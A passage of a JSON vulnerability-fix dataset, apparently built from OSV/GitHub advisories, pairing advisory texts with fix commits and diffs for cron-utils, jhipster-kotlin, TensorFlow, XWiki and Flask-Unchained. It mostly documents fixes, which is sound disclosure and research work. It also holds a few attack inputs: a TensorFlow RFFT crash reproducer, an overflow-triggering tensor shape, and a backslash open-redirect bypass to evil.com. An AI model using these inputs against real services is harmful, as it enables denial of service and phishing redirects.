repository](https:\/\/github.com\/jmrozanec\/cron-utils)","published_date":"2020-11-24","chain_len":1,"project":"https:\/\/github.com\/jmrozanec\/cron-utils","commit_href":"https:\/\/github.com\/jmrozanec\/cron-utils\/commit\/4cf373f7352f5d95f0bf6512af8af326b31c835e","commit_sha":"4cf373f7352f5d95f0bf6512af8af326b31c835e","patch":"SINGLE","chain_ord":"['4cf373f7352f5d95f0bf6512af8af326b31c835e']","before_first_fix_commit":"{'864f9f09af58bd48133a1492a09fb7fbc1c5858b'}","last_fix_commit":"4cf373f7352f5d95f0bf6512af8af326b31c835e","chain_ord_pos":1.0,"commit_datetime":"11\/17\/2020, 13:53:58","message":"Update dependencies to fix security vulnerability.","author":"Joze Rozanec","comments":null,"stats":"{'additions': 4, 'deletions': 3, 'total': 7}","files":"{'pom.xml': {'additions': 4, 'deletions': 3, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jmrozanec\/cron-utils\/raw\/4cf373f7352f5d95f0bf6512af8af326b31c835e\/pom.xml', 'patch': '@@ -121,11 +121,12 @@\\n             <scope>test<\/scope>\\n         <\/dependency>\\n         <dependency>\\n-            <groupId>org.hibernate<\/groupId>\\n-            <artifactId>hibernate-validator<\/artifactId>\\n+            <groupId>org.apache.bval<\/groupId>\\n+            <artifactId>bval-jsr<\/artifactId>\\n+            <version>1.1.2<\/version>\\n+            <!--The Hibernate dependency is no longer used, due to security vulnerabilities -->\\n             <!-- https:\/\/stackoverflow.com\/questions\/48323244\/java-lang-nosuchmethoderror-javax-validation-bootstrapconfiguration-getclockproExecutionTimeQuartzIntegrationTest -->\\n             <!-- https:\/\/stackoverflow.com\/questions\/24386771\/javax-validation-validationexception-hv000183-unable-to-load-javax-el-express -->\\n-            <version>5.3.6.Final<\/version>\\n             <scope>test<\/scope>\\n         <\/dependency>\\n         <dependency>'}}","message_norm":"update dependencies to fix security vulnerability.","language":"en","entities":"[('update', 'ACTION', ''), ('fix', 'ACTION', ''), ('security', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['pom.xml'])","num_files":1.0},{"index":2568,"vuln_id":"GHSA-pfxf-wh96-fvjc","cwe_id":"{'CWE-117'}","score":5.3,"chain":"{'https:\/\/github.com\/jhipster\/jhipster-kotlin\/commit\/426ccab85e7e0da562643200637b99b6a2a99449'}","dataset":"osv","summary":"Log Forging in generator-jhipster-kotlin ### Impact\n\nWe log the mail for invalid password reset attempts. \nAs the email is provided by a user and the api is public this can be used by an attacker to forge log entries.\nThis is vulnerable to https:\/\/cwe.mitre.org\/data\/definitions\/117.html\n\nThis problem affects only application generated with jwt or session authentication. Applications using oauth are not vulnerable.\n\n### Patches\n\nversion 1.7.0.\n\n### Workarounds\n\nIn `AccountResource.kt` you should change the line\n\n```kotlin\n log.warn(\"Password reset requested for non existing mail '$mail'\");\n```\n\nto \n\n```kotlin\n log.warn(\"Password reset requested for non existing mail\");\n```\n\n### References\n\n* https:\/\/cwe.mitre.org\/data\/definitions\/117.html\n* https:\/\/owasp.org\/www-community\/attacks\/Log_Injection\n* https:\/\/www.baeldung.com\/jvm-log-forging\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [jhipster kotlin](https:\/\/github.com\/jhipster\/jhipster-kotlin)","published_date":"2020-06-25","chain_len":1,"project":"https:\/\/github.com\/jhipster\/jhipster-kotlin","commit_href":"https:\/\/github.com\/jhipster\/jhipster-kotlin\/commit\/426ccab85e7e0da562643200637b99b6a2a99449","commit_sha":"426ccab85e7e0da562643200637b99b6a2a99449","patch":"SINGLE","chain_ord":"['426ccab85e7e0da562643200637b99b6a2a99449']","before_first_fix_commit":"{'72d229b48b87c5575c116a8b0ba6c3c9f02ac287'}","last_fix_commit":"426ccab85e7e0da562643200637b99b6a2a99449","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2020, 20:18:48","message":"prevent log forging when doing password reset init request","author":"Frederik Hahne","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'generators\/server\/templates\/src\/main\/kotlin\/package\/web\/rest\/AccountResource.kt.ejs': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jhipster\/jhipster-kotlin\/raw\/426ccab85e7e0da562643200637b99b6a2a99449\/generators%2Fserver%2Ftemplates%2Fsrc%2Fmain%2Fkotlin%2Fpackage%2Fweb%2Frest%2FAccountResource.kt.ejs', 'patch': '@@ -406,7 +406,7 @@ class AccountResource(\\n         } else {\\n             \/\/ Pretend the request has been successful to prevent checking which emails really exist\\n             \/\/ but log that an invalid attempt has been made\\n-            log.warn(\"Password reset requested for non existing mail \\'$mail\\'\");\\n+            log.warn(\"Password reset requested for non existing mail\");\\n         }\\n     }\\n     <%_ } else { _%>\\n@@ -418,7 +418,7 @@ class AccountResource(\\n                 } else {\\n                     \/\/ Pretend the request has been successful to prevent checking which emails really exist\\n                     \/\/ but log that an invalid attempt has been made\\n-                    log.warn(\"Password reset request for non existing email \\'$mail\\'\")\\n+                    log.warn(\"Password reset request for non existing email\")\\n                 }\\n             }.then()\\n     <%_ } _%>'}}","message_norm":"prevent log forging when doing password reset init request","language":"en","entities":"[('prevent', 'ACTION', ''), ('password', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['generators\/server\/templates\/src\/main\/kotlin\/package\/web\/rest\/AccountResource.kt.ejs'])","num_files":1.0},{"index":2574,"vuln_id":"GHSA-pgcq-h79j-2f69","cwe_id":"{'CWE-354'}","score":7.0,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4d74d8a00b07441cba090a02e0dd9ed385145bf4', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/da4aad5946be30e5f049920fa076e1f7ef021261', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e7f497570abb6b4ae5af4970620cd880e4c0c904', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4dddb2fd0b01cdd196101afbba6518658a2c9e07', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/579261dcd446385831fe4f7457d802a59685121d', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/68422b215e618df5ad375bcdc6d2052e9fd3080a'}","dataset":"osv","summary":"Incomplete validation of shapes in multiple TF ops ### Impact\nSeveral TensorFlow operations are missing validation for the shapes of the tensor arguments involved in the call. Depending on the API, this can result in undefined behavior and segfault or `CHECK`-fail related crashes but in some scenarios writes and reads from heap populated arrays are also possible.\n\nWe have discovered these issues internally via tooling while working on improving\/testing GPU op determinism. As such, we don't have reproducers and there will be multiple fixes for these issues.\n\n### Patches\nWe have patched the issue in GitHub commits [68422b215e618df5ad375bcdc6d2052e9fd3080a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/68422b215e618df5ad375bcdc6d2052e9fd3080a), [4d74d8a00b07441cba090a02e0dd9ed385145bf4](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4d74d8a00b07441cba090a02e0dd9ed385145bf4), [579261dcd446385831fe4f7457d802a59685121d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/579261dcd446385831fe4f7457d802a59685121d), [da4aad5946be30e5f049920fa076e1f7ef021261](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/da4aad5946be30e5f049920fa076e1f7ef021261), [4dddb2fd0b01cdd196101afbba6518658a2c9e07](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4dddb2fd0b01cdd196101afbba6518658a2c9e07), and [e7f497570abb6b4ae5af4970620cd880e4c0c904](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e7f497570abb6b4ae5af4970620cd880e4c0c904).\n\nThese fixes will be included in TensorFlow 2.7.0. We will also cherrypick these commits on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2021-11-10","chain_len":6,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e7f497570abb6b4ae5af4970620cd880e4c0c904","commit_sha":"e7f497570abb6b4ae5af4970620cd880e4c0c904","patch":"MULTI","chain_ord":"['579261dcd446385831fe4f7457d802a59685121d', '4d74d8a00b07441cba090a02e0dd9ed385145bf4', '68422b215e618df5ad375bcdc6d2052e9fd3080a', 'da4aad5946be30e5f049920fa076e1f7ef021261', '4dddb2fd0b01cdd196101afbba6518658a2c9e07', 'e7f497570abb6b4ae5af4970620cd880e4c0c904']","before_first_fix_commit":"{'e0214528739cad3bd02fbf2696a793dc342ffb94'}","last_fix_commit":"e7f497570abb6b4ae5af4970620cd880e4c0c904","chain_ord_pos":6.0,"commit_datetime":"10\/20\/2021, 22:41:05","message":"Fix segfault on OOM in Conv2D.\n\nPiperOrigin-RevId: 404655317\nChange-Id: I33588dbd3f5d0fef980e3c908bf5515a9ee09ce7","author":"Reed Wanderman-Milne","comments":null,"stats":"{'additions': 12, 'deletions': 3, 'total': 15}","files":"{'tensorflow\/core\/kernels\/conv_ops.cc': {'additions': 12, 'deletions': 3, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e7f497570abb6b4ae5af4970620cd880e4c0c904\/tensorflow%2Fcore%2Fkernels%2Fconv_ops.cc', 'patch': '@@ -183,20 +183,29 @@ struct LaunchGrouped {\\n     auto on_shuffled = [&]() { shuffles_completed.DecrementCount(); };\\n \\n     \/\/ Shuffle input into temporary tensor.\\n-    Tensor input_shuffled(input.dtype(), TensorShape(post_shuffle(input)));\\n+    Tensor input_shuffled;\\n+    OP_REQUIRES_OK(\\n+        ctx, ctx->allocate_temp(input.dtype(), TensorShape(post_shuffle(input)),\\n+                                &input_shuffled));\\n     input_shuffled.tensor<T, 5>().device(device, on_shuffled) =\\n         input.shaped<T, 5>(pre_shuffle(input)).shuffle(shuffle);\\n \\n     \/\/ Shuffle filter into temporary tensor.\\n-    Tensor filter_shuffled(filter.dtype(), TensorShape(post_shuffle(filter)));\\n+    Tensor filter_shuffled;\\n+    OP_REQUIRES_OK(ctx, ctx->allocate_temp(filter.dtype(),\\n+                                           TensorShape(post_shuffle(filter)),\\n+                                           &filter_shuffled));\\n     filter_shuffled.tensor<T, 5>().device(device, on_shuffled) =\\n         filter.shaped<T, 5>(pre_shuffle(filter)).shuffle(shuffle);\\n \\n     \/\/ Wait for the completion of input\/filter shuffles.\\n     shuffles_completed.Wait();\\n \\n     \/\/ Write group convolution results into temporary output tensor.\\n-    Tensor output_shuffled(output->dtype(), TensorShape(post_shuffle(*output)));\\n+    Tensor output_shuffled;\\n+    OP_REQUIRES_OK(ctx, ctx->allocate_temp(output->dtype(),\\n+                                           TensorShape(post_shuffle(*output)),\\n+                                           &output_shuffled));\\n \\n     for (int64_t i = 0; i < num_groups; ++i) {\\n       \/\/ TODO(ezhulenev): Run this loop using `parallelFor` (regular parallelFor'}}","message_norm":"fix segfault on oom in conv2d.\n\npiperorigin-revid: 404655317\nchange-id: i33588dbd3f5d0fef980e3c908bf5515a9ee09ce7","language":"en","entities":"[('fix', 'ACTION', ''), ('segfault', 'SECWORD', ''), ('404655317', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/conv_ops.cc'])","num_files":1.0},{"index":2575,"vuln_id":"GHSA-pgcq-h79j-2f69","cwe_id":"{'CWE-354'}","score":7.0,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4d74d8a00b07441cba090a02e0dd9ed385145bf4', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/da4aad5946be30e5f049920fa076e1f7ef021261', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e7f497570abb6b4ae5af4970620cd880e4c0c904', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4dddb2fd0b01cdd196101afbba6518658a2c9e07', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/579261dcd446385831fe4f7457d802a59685121d', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/68422b215e618df5ad375bcdc6d2052e9fd3080a'}","dataset":"osv","summary":"Incomplete validation of shapes in multiple TF ops ### Impact\nSeveral TensorFlow operations are missing validation for the shapes of the tensor arguments involved in the call. Depending on the API, this can result in undefined behavior and segfault or `CHECK`-fail related crashes but in some scenarios writes and reads from heap populated arrays are also possible.\n\nWe have discovered these issues internally via tooling while working on improving\/testing GPU op determinism. As such, we don't have reproducers and there will be multiple fixes for these issues.\n\n### Patches\nWe have patched the issue in GitHub commits [68422b215e618df5ad375bcdc6d2052e9fd3080a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/68422b215e618df5ad375bcdc6d2052e9fd3080a), [4d74d8a00b07441cba090a02e0dd9ed385145bf4](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4d74d8a00b07441cba090a02e0dd9ed385145bf4), [579261dcd446385831fe4f7457d802a59685121d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/579261dcd446385831fe4f7457d802a59685121d), [da4aad5946be30e5f049920fa076e1f7ef021261](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/da4aad5946be30e5f049920fa076e1f7ef021261), [4dddb2fd0b01cdd196101afbba6518658a2c9e07](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4dddb2fd0b01cdd196101afbba6518658a2c9e07), and [e7f497570abb6b4ae5af4970620cd880e4c0c904](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e7f497570abb6b4ae5af4970620cd880e4c0c904).\n\nThese fixes will be included in TensorFlow 2.7.0. We will also cherrypick these commits on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2021-11-10","chain_len":6,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4dddb2fd0b01cdd196101afbba6518658a2c9e07","commit_sha":"4dddb2fd0b01cdd196101afbba6518658a2c9e07","patch":"MULTI","chain_ord":"['579261dcd446385831fe4f7457d802a59685121d', '4d74d8a00b07441cba090a02e0dd9ed385145bf4', '68422b215e618df5ad375bcdc6d2052e9fd3080a', 'da4aad5946be30e5f049920fa076e1f7ef021261', '4dddb2fd0b01cdd196101afbba6518658a2c9e07', 'e7f497570abb6b4ae5af4970620cd880e4c0c904']","before_first_fix_commit":"{'e0214528739cad3bd02fbf2696a793dc342ffb94'}","last_fix_commit":"e7f497570abb6b4ae5af4970620cd880e4c0c904","chain_ord_pos":5.0,"commit_datetime":"10\/20\/2021, 21:53:58","message":"Fix segfault in pools on empty shapes when certain dimension were very large.\n\nPooling ops multiply certain components of the input shape, e.g. by multiplying input.shape[1] * input.shape[2] * input.shape[3]. This multiplication could overflow an int64 value if shape[0] was 0 but shape[1], shape[2], and shape[3] were very large, e.g. by passing an input with shape (0, 2**25, 2**25, 2**25).\n\nPiperOrigin-RevId: 404644978\nChange-Id: Ic79f89c970357ca2962b1f231449066db9403146","author":"Reed Wanderman-Milne","comments":null,"stats":"{'additions': 9, 'deletions': 0, 'total': 9}","files":"{'tensorflow\/core\/kernels\/pooling_ops_common.h': {'additions': 9, 'deletions': 0, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/4dddb2fd0b01cdd196101afbba6518658a2c9e07\/tensorflow%2Fcore%2Fkernels%2Fpooling_ops_common.h', 'patch': \"@@ -189,6 +189,9 @@ class MaxPoolingOp : public OpKernel {\\n   void SpatialMaxPool(OpKernelContext* context, Tensor* output,\\n                       const Tensor& tensor_in, const PoolParameters& params,\\n                       const Padding& padding) {\\n+    if (output->NumElements() == 0) {\\n+      return;\\n+    }\\n     \/\/ On GPU, use Eigen's Spatial Max Pooling.  On CPU, use an\\n     \/\/ EigenMatrix version that is currently faster than Eigen's\\n     \/\/ Spatial MaxPooling implementation.\\n@@ -443,6 +446,9 @@ class MaxPoolingV2Op : public OpKernel {\\n   void SpatialMaxPool(OpKernelContext* context, Tensor* output,\\n                       const Tensor& tensor_in, const PoolParameters& params,\\n                       const Padding& padding) {\\n+    if (output->NumElements() == 0) {\\n+      return;\\n+    }\\n     \/\/ On GPU, use Eigen's Spatial Max Pooling.  On CPU, use an\\n     \/\/ EigenMatrix version that is currently faster than Eigen's\\n     \/\/ Spatial MaxPooling implementation.\\n@@ -561,6 +567,9 @@ template <typename Device, typename T>\\n void SpatialAvgPool(OpKernelContext* context, Tensor* output,\\n                     const Tensor& input, const PoolParameters& params,\\n                     const Padding& padding) {\\n+  if (output->NumElements() == 0) {\\n+    return;\\n+  }\\n   typedef Eigen::Map<const Eigen::Matrix<T, Eigen::Dynamic, Eigen::Dynamic>>\\n       ConstEigenMatrixMap;\\n   typedef Eigen::Map<Eigen::Matrix<T, Eigen::Dynamic, Eigen::Dynamic>>\"}}","message_norm":"fix segfault in pools on empty shapes when certain dimension were very large.\n\npooling ops multiply certain components of the input shape, e.g. by multiplying input.shape[1] * input.shape[2] * input.shape[3]. this multiplication could overflow an int64 value if shape[0] was 0 but shape[1], shape[2], and shape[3] were very large, e.g. by passing an input with shape (0, 2**25, 2**25, 2**25).\n\npiperorigin-revid: 404644978\nchange-id: ic79f89c970357ca2962b1f231449066db9403146","language":"en","entities":"[('fix', 'ACTION', ''), ('segfault', 'SECWORD', ''), ('overflow', 'SECWORD', ''), ('404644978', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/pooling_ops_common.h'])","num_files":1.0},{"index":2587,"vuln_id":"GHSA-ph5x-h23x-7q5q","cwe_id":"{'CWE-79', 'CWE-116'}","score":7.4,"chain":"{'https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/27f839133d41877e538d35fa88274b50a1c00b9b'}","dataset":"osv","summary":"Cross-site Scripting in wiki manager join wiki page ### Impact\nWe found a possible XSS vector in the `WikiManager.JoinWiki ` wiki page related to the \"requestJoin\" field.\n\n### Patches\nThe issue is patched in versions 12.10.11, 14.0-rc-1, 13.4.7, 13.10.3.\n\n### Workarounds\nThe easiest workaround is to edit the wiki page `WikiManager.JoinWiki` (with wiki editor) and change the line\n\n```\n<input type='hidden' name='requestJoin' value=\"$!request.requestJoin\"\/>\n```\n\ninto\n\n```\n<input type='hidden' name='requestJoin' value=\"$escapetool.xml($!request.requestJoin)\">\n```\n\n### References\n  * https:\/\/jira.xwiki.org\/browse\/XWIKI-19292\n  * https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/27f839133d41877e538d35fa88274b50a1c00b9b\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Jira XWiki](https:\/\/jira.xwiki.org)\n* Email us at [security mailing list](mailto:security@xwiki.org)","published_date":"2022-05-25","chain_len":1,"project":"https:\/\/github.com\/xwiki\/xwiki-platform","commit_href":"https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/27f839133d41877e538d35fa88274b50a1c00b9b","commit_sha":"27f839133d41877e538d35fa88274b50a1c00b9b","patch":"SINGLE","chain_ord":"['27f839133d41877e538d35fa88274b50a1c00b9b']","before_first_fix_commit":"{'bd935320bee3c27cf7548351b1d0f935f116d437'}","last_fix_commit":"27f839133d41877e538d35fa88274b50a1c00b9b","chain_ord_pos":1.0,"commit_datetime":"01\/04\/2022, 10:35:46","message":"XWIKI-19292: Fix bad escaping","author":"Thomas Mortagne","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'xwiki-platform-core\/xwiki-platform-wiki\/xwiki-platform-wiki-ui\/xwiki-platform-wiki-ui-mainwiki\/src\/main\/resources\/WikiManager\/JoinWiki.xml': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/xwiki\/xwiki-platform\/raw\/27f839133d41877e538d35fa88274b50a1c00b9b\/xwiki-platform-core%2Fxwiki-platform-wiki%2Fxwiki-platform-wiki-ui%2Fxwiki-platform-wiki-ui-mainwiki%2Fsrc%2Fmain%2Fresources%2FWikiManager%2FJoinWiki.xml', 'patch': '@@ -245,7 +245,7 @@\\n                   &lt;a href=\"$backUrl\" class=\\'button secondary\\'&gt;{{translation key=\"platform.wiki.users.join.request.cancel.label\"\/}}&lt;\/a&gt;\\n                 &lt;\/span&gt;\\n                 &lt;input type=\\'hidden\\' name=\\'wikiId\\' value=\"$!wikiId\"\/&gt;\\n-                &lt;input type=\\'hidden\\' name=\\'requestJoin\\' value=\"$!request.requestJoin\"\/&gt;\\n+                &lt;input type=\\'hidden\\' name=\\'requestJoin\\' value=\"$escapetool.xml($!request.requestJoin)\"\/&gt;\\n                 &lt;input type=\"hidden\" name=\"form_token\" value=\"$!escapetool.xml($services.csrf.getToken())\" \/&gt;\\n               &lt;\/dl&gt;\\n             &lt;\/form&gt;'}}","message_norm":"xwiki-19292: fix bad escaping","language":"ca","entities":"[('fix', 'ACTION', ''), ('escaping', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['xwiki-platform-core\/xwiki-platform-wiki\/xwiki-platform-wiki-ui\/xwiki-platform-wiki-ui-mainwiki\/src\/main\/resources\/WikiManager\/JoinWiki.xml'])","num_files":1.0},{"index":2588,"vuln_id":"GHSA-ph87-fvjr-v33w","cwe_id":"{'CWE-617'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/31bd5026304677faa8a0b77602c6154171b9aec1'}","dataset":"osv","summary":"CHECK-fail in `tf.raw_ops.RFFT` ### Impact\nAn attacker can cause a denial of service by exploiting a `CHECK`-failure coming from the implementation of `tf.raw_ops.RFFT`:\n    \n```python\nimport tensorflow as tf\n\ninputs = tf.constant([1], shape=[1], dtype=tf.float32)\nfft_length = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.RFFT(input=inputs, fft_length=fft_length)\n```\n\nThe above example causes Eigen code to operate on an empty matrix. This triggers on an assertion and causes program termination.\n    \n### Patches\nWe have patched the issue in GitHub commit [31bd5026304677faa8a0b77602c6154171b9aec1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/31bd5026304677faa8a0b77602c6154171b9aec1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/31bd5026304677faa8a0b77602c6154171b9aec1","commit_sha":"31bd5026304677faa8a0b77602c6154171b9aec1","patch":"SINGLE","chain_ord":"['31bd5026304677faa8a0b77602c6154171b9aec1']","before_first_fix_commit":"{'1c56f53be0b722ca657cbc7df461ed676c8642a2'}","last_fix_commit":"31bd5026304677faa8a0b77602c6154171b9aec1","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 00:42:54","message":"Prevent check fail in FFT\n\nPiperOrigin-RevId: 372031044\nChange-Id: I50994e3e8a5d1342d01bde80256f6bf2730ca299","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/fft_ops.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/31bd5026304677faa8a0b77602c6154171b9aec1\/tensorflow%2Fcore%2Fkernels%2Ffft_ops.cc', 'patch': '@@ -222,6 +222,9 @@ class FFTCPU : public FFTBase {\\n       input_slice_sizes[i] = fft_shape[i - 1];\\n       temp_shape.AddDim(fft_shape[i - 1]);\\n     }\\n+    OP_REQUIRES(ctx, temp_shape.num_elements() > 0,\\n+                errors::InvalidArgument(\"Obtained a FFT shape of 0 elements: \",\\n+                                        temp_shape.DebugString()));\\n \\n     auto output = out->flat_inner_dims<ComplexT, FFTRank + 1>();\\n     const Eigen::DSizes<Eigen::DenseIndex, FFTRank + 1> zero_start_indices;'}}","message_norm":"prevent check fail in fft\n\npiperorigin-revid: 372031044\nchange-id: i50994e3e8a5d1342d01bde80256f6bf2730ca299","language":"en","entities":"[('prevent', 'ACTION', ''), ('372031044', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/fft_ops.cc'])","num_files":1.0},{"index":2593,"vuln_id":"GHSA-pjc4-3w99-j7v4","cwe_id":"{'CWE-601'}","score":5.4,"chain":"{'https:\/\/github.com\/briancappello\/flask-unchained\/commit\/2bfeedf1bc31df851cab8c66df0c432b10406aad', 'https:\/\/github.com\/briancappello\/flask-unchained\/commit\/71e36b28166f9ffbe0a991f51127f0984f7e6a40'}","dataset":"osv","summary":"Open redirect in Flask-Unchained This affects the package Flask-Unchained before 0.9.0. When using the the _validate_redirect_url function, it is possible to bypass URL validation and redirect a user to an arbitrary URL by providing multiple back slashes such as \\\\\\evil.com\/path. This vulnerability is only exploitable if an alternative WSGI server other than Werkzeug is used, or the default behaviour of Werkzeug is modified using 'autocorrect_location_header=False.","published_date":"2021-06-15","chain_len":2,"project":"https:\/\/github.com\/briancappello\/flask-unchained","commit_href":"https:\/\/github.com\/briancappello\/flask-unchained\/commit\/2bfeedf1bc31df851cab8c66df0c432b10406aad","commit_sha":"2bfeedf1bc31df851cab8c66df0c432b10406aad","patch":"MULTI","chain_ord":"['2bfeedf1bc31df851cab8c66df0c432b10406aad', '71e36b28166f9ffbe0a991f51127f0984f7e6a40']","before_first_fix_commit":"{'2bfeedf1bc31df851cab8c66df0c432b10406aad'}","last_fix_commit":"71e36b28166f9ffbe0a991f51127f0984f7e6a40","chain_ord_pos":1.0,"commit_datetime":"05\/27\/2021, 17:47:52","message":"security fixes","author":"Brian Cappello","comments":null,"stats":"{'additions': 27, 'deletions': 8, 'total': 35}","files":"{'flask_unchained\/bundles\/controller\/utils.py': {'additions': 27, 'deletions': 8, 'changes': 35, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/briancappello\/flask-unchained\/raw\/2bfeedf1bc31df851cab8c66df0c432b10406aad\/flask_unchained%2Fbundles%2Fcontroller%2Futils.py', 'patch': '@@ -6,7 +6,7 @@\\n from flask_unchained._compat import is_local_proxy\\n from py_meta_utils import _missing\\n from typing import *\\n-from urllib.parse import urlsplit\\n+from urllib.parse import urlsplit, quote as urlquote\\n from werkzeug.routing import BuildError, UnicodeConverter\\n \\n from .attr_constants import CONTROLLER_ROUTES_ATTR, REMOVE_SUFFIXES_ATTR\\n@@ -183,6 +183,11 @@ def method_name_to_url(method_name) -> str:\\n     return \\'\/\\' + kebab_case(method_name).strip(\\'-\\')\\n \\n \\n+def encode_non_url_reserved_characters(url):\\n+    # safe url reserved characters: https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-2.2\\n+    return urlquote(url, safe=\":\/?#[]@!$&\\'()*+,;=\")\\n+\\n+\\n # modified from flask_security.utils.get_post_action_redirect\\n def redirect(where: Optional[str] = None,\\n              default: Optional[str] = None,\\n@@ -235,7 +240,7 @@ def redirect(where: Optional[str] = None,\\n \\n     for url in urls:\\n         if _validate_redirect_url(url, _external_host):\\n-            return flask_redirect(url)\\n+            return flask_redirect(encode_non_url_reserved_characters(url))\\n     return flask_redirect(\\'\/\\')\\n \\n \\n@@ -289,15 +294,29 @@ def _url_for(endpoint: str, **values) -> Union[str, None]:\\n \\n # modified from flask_security.utils.validate_redirect_url\\n def _validate_redirect_url(url, _external_host=None):\\n-    if url is None or url.strip() == \\'\\':\\n+    url = (url or \\'\\').strip().replace(\\'\\\\\\\\\\', \\'\/\\')\\n+\\n+    # reject empty urls and urls starting with 3+ slashes or a control character\\n+    if not url or url.startswith(\\'\/\/\/\\') or ord(url[0]) <= 32:\\n         return False\\n+\\n     url_next = urlsplit(url)\\n     url_base = urlsplit(request.host_url)\\n-    external_host = _external_host or current_app.config.get(\\'EXTERNAL_SERVER_NAME\\', \\'\\')\\n-    if ((url_next.netloc or url_next.scheme)\\n-            and url_next.netloc != url_base.netloc\\n-            and url_next.netloc not in external_host):\\n-        return False\\n+    if url_next.netloc or url_next.scheme:\\n+        # require both netloc and scheme\\n+        if not url_next.netloc or not url_next.scheme:\\n+            return False\\n+\\n+        # if external host, require same netloc and scheme\\n+        external_host = _external_host or current_app.config.get(\\'EXTERNAL_SERVER_NAME\\', \\'\\')\\n+        if external_host:\\n+            url_external = urlsplit(external_host)\\n+            if url_next.netloc == url_external.netloc and url_next.scheme == url_external.scheme:\\n+                return True\\n+\\n+        # require same netloc and scheme\\n+        if url_next.netloc != url_base.netloc or url_next.scheme != url_base.scheme:\\n+            return False\\n     return True'}}","message_norm":"security fixes","language":"en","entities":"[('security', 'SECWORD', ''), ('fixes', 'ACTION', 